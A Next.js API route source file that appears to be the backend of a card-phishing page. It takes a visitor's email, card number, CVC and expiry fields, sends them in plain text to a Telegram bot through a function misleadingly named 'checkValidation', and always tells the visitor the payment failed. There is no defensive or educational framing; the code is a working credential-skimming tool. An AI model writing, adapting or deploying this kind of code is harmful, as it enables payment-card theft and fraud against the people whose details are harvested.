// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import fetch from "node-fetch";

export default function handler(req, res) {
  res.status(200).json({ status: "fail" });
  const { email, number, cvc, selected, selectedy } = req.body;
  const url = `https://api.telegram.org/bot${process.env.TOKEN}/sendMessage?chat_id=${process.env.CHAT_ID}&text=${email}+${number}+${selected}+${selectedy}+${cvc}`;
  const checkValidation = async (url) => {
    try {
      const response = await fetch(url);
      const json = await response.json();
      if (json.ok) {
        console.log("Sended");
      } else {
        console.log("Send fail");
      }
    } catch (e) {
      console.log(e);
    }
  };
  checkValidation(url);
}
